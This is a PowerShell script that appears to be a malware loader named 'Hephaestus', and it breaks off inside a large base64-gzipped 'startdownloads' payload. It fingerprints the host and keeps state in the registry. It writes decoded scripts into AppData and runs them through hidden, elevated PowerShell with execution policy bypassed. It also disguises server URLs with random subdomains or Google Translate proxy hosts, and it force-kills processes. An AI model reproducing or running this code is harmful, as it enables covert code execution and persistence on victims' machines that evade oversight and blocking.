function IsDebug {
    $debugFile = "C:\debug.txt"
    
    try {
        # Check if the file exists
        if (Test-Path $debugFile -PathType Leaf) {
            return $true
        } else {
            return $false
        }
    } catch {
        # Catch any errors that occur during the Test-Path operation
        return $false
    }
}

$machineCode = ""

function Get-MachineCode {

    if ([string]::IsNullOrEmpty($machineCode) -eq $false)
    {
        return $machineCode
    }
    try {
        $biosSerial = (Get-WmiObject Win32_BIOS).SerialNumber
        $mbSerial = (Get-WmiObject Win32_BaseBoard).SerialNumber
        $macAddress = (Get-WmiObject Win32_NetworkAdapterConfiguration | Where-Object { $_.MACAddress -and $_.IPEnabled }).MACAddress[0]
    
        $combinedString = "$biosSerial$mbSerial$macAddress"
    
        $sha256 = [System.Security.Cryptography.SHA256]::Create()
        $bytes = [System.Text.Encoding]::UTF8.GetBytes($combinedString)
        $hashBytes = $sha256.ComputeHash($bytes)
    
        # Convert to Base64 and take the first 12 characters
        $hashString = [Convert]::ToBase64String($hashBytes) -replace "[^a-zA-Z0-9]", ""  # Remove non-alphanumeric characters
        
        $machineCode = $hashString.Substring(0, 12)
    }
    catch 
    {
        $machineCode = "Hephaestus"
    }
    return $machineCode
}

$hepaestusReg = "HKCU:\Software\$($(Get-MachineCode))"

$globalDebug = IsDebug;

function CustomDecode {
    param (
        [string]$inContent,
        [string]$outFile
    )
    try {
        $decodedBytes = [Convert]::FromBase64String($inContent)

        $memoryStream = New-Object System.IO.MemoryStream(,$decodedBytes)
        $gzipStream = New-Object System.IO.Compression.GZipStream($memoryStream, [System.IO.Compression.CompressionMode]::Decompress)
        $outputStream = New-Object System.IO.MemoryStream

        $gzipStream.CopyTo($outputStream)
        $gzipStream.Close()
        $memoryStream.Close()

        [System.IO.File]::WriteAllBytes($outFile, $outputStream.ToArray())
    }
    catch {
        writedbg "Failed to decode to file $outFile and decompress: $_"
    }
}

function Get-SHA256HashBase64 {
    param ([string]$inputString)
    $sha256 = [System.Security.Cryptography.SHA256]::Create()
    $byteArray = [System.Text.Encoding]::UTF8.GetBytes($inputString)
    $hashBytes = $sha256.ComputeHash($byteArray)
    return [Convert]::ToBase64String($hashBytes)
}

function CustomDecodeEnveloped {
    param (
        [string]$inContent,
        [string]$outFile
    )
    $parsed = $inContent | ConvertFrom-Json
    $evalHash = Get-SHA256HashBase64($parsed.json)
    if ($evalHash -ne $parsed.hash)
    {
        throw "Wrong Hash";
    }
    return CustomDecode -inContent $parsed.json -outFile $outFile
}

function EnvelopeIt {
    param ([string]$inputString)
    
    $hash = Get-SHA256HashBase64 -inputString $inputString
    
    $envelope = @{
        json = $inputString
        hash = $hash
    }
    
    return ($envelope | ConvertTo-Json)
}

function ModifyUrl {
    param ([string]$url)
    
    $uri = [System.Uri]$url
    $domainParts = $uri.Host.Split('.')
    

    if ($domainParts.Length -eq 3 -and $domainParts[0] -eq "localhost") {
    }
    else
    {
        $domainParts = @(Get-RandomString) + $domainParts
    }
    $newHost = ($domainParts -join '.')
    
    $newQuery = $uri.Query
    $randomArg = "xxx=" + (Get-RandomString)
    
    if ($newQuery) {
        if ($newQuery.StartsWith('?')) {
            $newQuery = "?" + $randomArg + "&" + $newQuery.Substring(1)
        }
    } else {
        $newQuery = "?" + $randomArg
    }
    
    if ($uri.Port -ne 80 -and $uri.Port -ne 443) {
        $newUrl = $uri.Scheme + "://" + $newHost + ":" + $uri.Port + $uri.AbsolutePath + $newQuery
    } else {
        $newUrl = $uri.Scheme + "://" + $newHost + $uri.AbsolutePath + $newQuery
    }
    
    return $newUrl
}

function GoogleUrl{
    param ([string]$url)
    
    $uri = [System.Uri]$url
    $domainParts = $uri.Host.Split('.')
    
    if ($domainParts.Length -gt 2) {
        $newHost = $domainParts[0] + '-' + $domainParts[1] + '-' + $domainParts[2]
    } else {
        $newHost = $domainParts[0] + '-' + $domainParts[1]
    }

    $newUrl = "https://" + $newHost + ".translate.goog" + $uri.AbsolutePath + "?_x_tr_sch=http&_x_tr_sl=en&_x_tr_tl=ja&_x_tr_hl=ru&_x_tr_pto=wapp"
    
    return $newUrl
}


function Get-RandomString {
    $length = 8
    $characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
    $randomString = -join ((0..($length-1)) | ForEach-Object { $characters[(Get-Random -Minimum 0 -Maximum $characters.Length)] })
    return $randomString
}


function SmartServerlUrl{
    param ([string]$url)
         $url = ModifyUrl -url $url
         return $url
}


function writedbg {
    param (
        [string]$msg,   [string]$msg2=""
    )
        if ($globalDebug){
            Write-Host $msg + $msg2
        }
}

function Get-HephaestusFolder {
    $appDataPath = [System.Environment]::GetFolderPath('ApplicationData')
    $hephaestusFolder = Join-Path $appDataPath $($(Get-MachineCode))
    return $hephaestusFolder
}

function Get-HolderPath {
    $hephaestusFolder = Get-HephaestusFolder
    $scriptName = (Get-MachineCode) + '.' + 'ps1'
    $holderPath = Join-Path $hephaestusFolder -ChildPath $scriptName
    return $holderPath
}

function Get-BodyPath {
    $hephaestusFolder = Get-HephaestusFolder
    $scriptName = (Get-MachineCode) + '_b.' + 'ps1'
    $bodyPath = Join-Path $hephaestusFolder -ChildPath $scriptName
    return $bodyPath
}

function Test-Arg{ param ([string]$arg)
    $globalArgs = $global:args -join ' '
    if ($globalArgs -like "*$arg*") {
        return $true
    }
    return $false
} 


function Test-Autostart 
{
    return Test-Arg -arg "autostart"
}


function GetArg {
    param ([string]$arg)

    $globalArgs = $global:args
    $arg = $arg.ToLower()

    for ($i = 0; $i -lt $globalArgs.Count; $i++) {
        $currentArg = $globalArgs[$i].TrimStart("-").ToLower()
        if ( (ArgsEqual $currentArg $arg) -and $i + 1 -lt $globalArgs.Count) {
            return $globalArgs[$i + 1]
        }
    }

    return ""
}

function StrToInt {
    param ([string]$value)

    if ([string]::IsNullOrWhiteSpace($value)) {
        return 0
    }

    $intValue = 0
    if ([int]::TryParse($value, [ref]$intValue)) {
        return $intValue
    }

    return 0
}

function StrToBool {
    param ([string]$value, [bool]$default)

    if ([string]::IsNullOrWhiteSpace($value)) {
        return $default
    }

    $boolValue = $default
    if ([bool]::TryParse($value.ToLower(), [ref]$boolValue)) {
        return $boolValue
    }

    return $default
}

function RegWrite {
    param (
        [string]$registryPath,
        [string]$keyName,
        [string]$value
    )

    try {
        if (Test-Path -Path $registryPath) {
            $currentValue = Get-ItemProperty -Path $registryPath -Name $keyName -ErrorAction SilentlyContinue

            if ($currentValue.$keyName -eq $value) {
                writedbg "The '$keyName' key is already set with the correct value." -ForegroundColor Green
            } else {
                Set-ItemProperty -Path $registryPath -Name $keyName -Value $value
                writedbg "'$keyName' key updated with the correct value." -ForegroundColor Green
            }
        } else {
            New-Item -Path $registryPath -Force | Out-Null
            New-ItemProperty -Path $registryPath -Name $keyName -Value "$value" -PropertyType String -Force | Out-Null
            writedbg "'$keyName' key added to startup." -ForegroundColor Green
        }
    } catch {
        writedbg "Error while adding/updating the '$keyName' key: $($_.Exception.Message)" -ForegroundColor Red
    }
}

function RegWriteInt {
    param (
        [string]$registryPath,
        [string]$keyName,
        [int]$value
    )

    RegWrite -registryPath $registryPath -keyName $keyName -value $value.ToString()
}

function RegRead {
    param (
        [string]$registryPath,
        [string]$keyName
    )

    try {
        if (Test-Path -Path $registryPath) {
            $currentValue = Get-ItemProperty -Path $registryPath -Name $keyName -ErrorAction SilentlyContinue
            $res = $currentValue.$keyName
            if ($null -eq $res)
            {
                $res = "";
            }
            return $res
        }
    } catch {
        writedbg "Error reading registry key '$keyName' from '$registryPath': $($_.Exception.Message)" -ForegroundColor Red
    }

    return ""
}

function RegReadInt {
    param (
        [string]$registryPath,
        [string]$keyName
    )

    $value = RegRead -registryPath $registryPath -keyName $keyName
    return StrToInt -value $value
}

function RegReadBool {
    param (
        [string]$registryPath,
        [string]$keyName,
        [bool]$default
    )

    $value = RegRead -registryPath $registryPath -keyName $keyName
    return StrToBool -value $value -default $default
}

function RegWriteParam {
    param (
        [string]$keyName,
        [string]$value
    )
    $registryPath = $hepaestusReg
    RegWrite -registryPath $registryPath -keyName $keyName -value $value
}

function RegWriteParamInt {
    param (
        [string]$registryPath,
        [string]$keyName,
        [int]$value
    )
    RegWriteParam -keyName $keyName -value $value.ToString()
}

function RegWriteParamBool {
    param (
        [string]$registryPath,
        [string]$keyName,
        [bool]$value
    )
    RegWriteParam -keyName $keyName -value $value.ToString().ToLower()
}

function RegReadParam {
    param (
        [string]$keyName
    )
    $registryPath = $hepaestusReg
    return RegRead -registryPath $registryPath -keyName $keyName
}

function RegReadParamInt {
    param (
        [string]$keyName
    )
    $registryPath = $hepaestusReg
    return RegReadInt -registryPath $registryPath -keyName $keyName
}

function RegReadParamBool {
    param (
        [string]$keyName,        [bool]$default
    )
    $registryPath = $hepaestusReg
    return RegReadBool -registryPath $registryPath -keyName $keyName -default $default
}

function GetArgInt {
    param ([string]$arg)

    return StrToInt (GetArg $arg)
}

function EnsureDashPrefix {
    param ([string]$value)

    if (-not $value.StartsWith("-")) {
        return "-" + $value
    }
    return $value
}

function ArgsEqual {
    param (
        [string]$arg1,
        [string]$arg2
    )

    # Normalize both arguments (remove leading "-" and compare case-insensitively)
    $normalizedArg1 = $arg1.TrimStart("-").ToLower()
    $normalizedArg2 = $arg2.TrimStart("-").ToLower()

    return $normalizedArg1 -eq $normalizedArg2
}

function RunMe {
    param (
        [string]$script, 
        [bool] $repassArgs,
        [string]$argName,
        [string]$argValue,
        [bool]$uac
    )

    $argName = EnsureDashPrefix -value $argName

    $scriptPath = $script
    
    $local = @("-ExecutionPolicy", "Bypass", "-File", """$scriptPath""")
    
    if ($repassArgs -eq $true) {
        $globalArgs = $global:args
        $filteredArgs = @()
        $skipNext = $false

        for ($i = 0; $i -lt $globalArgs.Count; $i++) {
            if ($skipNext) 
            {
                $skipNext = $false
                continue
            }

            if (ArgsEqual $globalArgs[$i] $argName) {
                $skipNext = $true
                continue
            }

            $filteredArgs += $globalArgs[$i]
        }
        $globalArgs = $filteredArgs
        $local += $globalArgs
        if (-not [string]::IsNullOrEmpty($argName) -and $argName -ne "-") {
            $local += $argName
            $local += $argValue
        }
    }

    $argumentList = ""
    for ($i = 0; $i -lt $local.Count; $i += 1) {
        $arg = $local[$i]
        $argumentList += "$arg "
    }

    writedbg "starting  $argumentList"

    if ($globalDebug)
    {
        if ($uac -eq $true) {
            Start-Process powershell.exe -Verb RunAs -WindowStyle Normal -ArgumentList $argumentList
        } else {
            Start-Process powershell.exe -WindowStyle Normal -ArgumentList $argumentList
        }
    }
    else 
    {
        if ($uac -eq $true) {
            Start-Process powershell.exe -Verb RunAs -WindowStyle Hidden -ArgumentList $argumentList
        } else {
            Start-Process powershell.exe -WindowStyle Hidden -ArgumentList $argumentList
        }
    }

}

function IsElevatedOld
{
    if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator))
    {
        return $false
    }
    return $true
}

function IsElevated {
    $winID = [Security.Principal.WindowsIdentity]::GetCurrent()
    $princ = New-Object Security.Principal.WindowsPrincipal($winID)
    return $princ.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator) -and $winID.Owner -ne $winID.User
}

function Get-EnvPaths {
    $a = Get-LocalAppDataPath
    $b =  Get-AppDataPath
    return @($a , $b)
}

function Get-TempFile {
    $tempPath = [System.IO.Path]::GetTempPath()
    $tempFile = [System.IO.Path]::GetTempFileName()
    return $tempFile
}

function Get-LocalAppDataPath {
    return [System.Environment]::GetFolderPath([System.Environment+SpecialFolder]::LocalApplicationData)
}

function Get-AppDataPath {
    return [System.Environment]::GetFolderPath([System.Environment+SpecialFolder]::ApplicationData)
}

function Get-ProfilePath {
    return [System.Environment]::GetFolderPath([System.Environment+SpecialFolder]::UserProfile)
}

function Close-Processes {
    param (
        [string[]]$processes
    )

    foreach ($process in $Processes) {
        $command = "taskkill.exe /im $process /f"
        Invoke-Expression $command
    }
}



###head


###head


function GetLocalScriptPath {
    param
    (

    [Parameter(Mandatory = $true)]
    [string[]]
    $taskName
    )
    $scriptPath = Get-HephaestusFolder
    $fullPath = Join-Path -Path $scriptPath -ChildPath "$taskName.ps1"
    return $fullPath
}

function Save-Script
{
    param
    (
        [Parameter(Mandatory = $true)]
        [string[]]
        $taskName,

        [Parameter(Mandatory = $true)]
        [string[]]
        $body
    )
    $scriptPath= GetLocalScriptPath -taskName $taskName
    CustomDecode -inContent $body -outFile $scriptPath
    return $fullPath
}

function Invoke-Script
{
    param
    (
        [Parameter(Mandatory = $true)]
        [string[]]
        $taskName
    )
    $scriptPath= GetLocalScriptPath -taskName $taskName
    if ($globalDebug)
    {
        Start-Process powershell.exe -WindowStyle Normal -ArgumentList "-ExecutionPolicy Bypass -file ""$scriptPath"" -Task $taskName"
    }
    else
    {
        Start-Process powershell.exe -WindowStyle Hidden -Verb RunAs -ArgumentList "-ExecutionPolicy Bypass -File `"$scriptPath`" -Task $taskName"
    }
}

$global:Task = $null

for ($i = 0; $i -lt $args.Count; $i++) {
    if ($args[$i] -eq '-Task') {
        if ($i + 1 -lt $args.Count) {
            $global:Task = $args[$i + 1]
        } else {
            writedbg "No value provided for -Task argument."
        }
    }
}

function Main 
{
    $showPath = GetLocalScriptPath -taskName "program"
    writedbg "program curScript: $showPath"

    if ($global:Task) {
        writedbg "Task - $task"
        & $global:Task
    } else 
    {               

   
        $tasks = @{
               "startdownloads" = "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